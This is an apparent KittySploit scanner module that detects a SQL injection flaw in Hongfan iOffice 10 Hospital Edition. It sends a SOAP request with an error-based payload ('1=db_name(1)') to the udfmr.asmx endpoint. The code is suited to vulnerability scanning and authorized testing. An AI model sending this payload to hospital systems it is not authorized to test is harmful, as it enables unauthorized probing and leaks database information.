#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""There is a SQL injection vulnerability in Hongfan iOffice 10 Hospital Edition, which can be exploited by attac."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Hongfan OA udfmr.asmx - SQL injection Detection',
        'description': 'There is a SQL injection vulnerability in Hongfan iOffice 10 Hospital Edition, which can be exploited by attackers to obtain sensitive database information.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'hongfan', 'oa', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/lal0ne/vulnerability/blob/main/%E7%BA%A2%E5%B8%86OA/iOffice_sqlscan/sql.py',
            'https://github.com/MrWQ/vulnerability-paper/blob/master/bugs/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91%E7%BA%A2%E5%B8%86%E5%8C%BB%E7%96%97%E4%BA%91%20OA%20udfmr.asmx%20SQL%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md',
        ],
    }

    def run(self):
        path = '/iOffice/prg/set/wss/udfmr.asmx'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'text/xml; charset=utf-8', 'SOAPAction': 'http://tempuri.org/ioffice/udfmr/GetEmpSearch'}, data='<?xml version="1.0" encoding="utf-8"?>\n<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n  <soap:Body>\n    <GetEmpSearch xmlns="http://tempuri.org/ioffice/udfmr">\n      <condition>1=db_name(1)</condition>\n    </GetEmpSearch>\n  </soap:Body>\n</soap:Envelope>\n')
        if not r or r.status_code != 500:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('System.Data.SqlClient.SqlException:', 'nvarchar',)
        header_any = ('text/xml',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Hongfan OA udfmr.asmx - SQL injection detected', path=path)
            return True
        return False

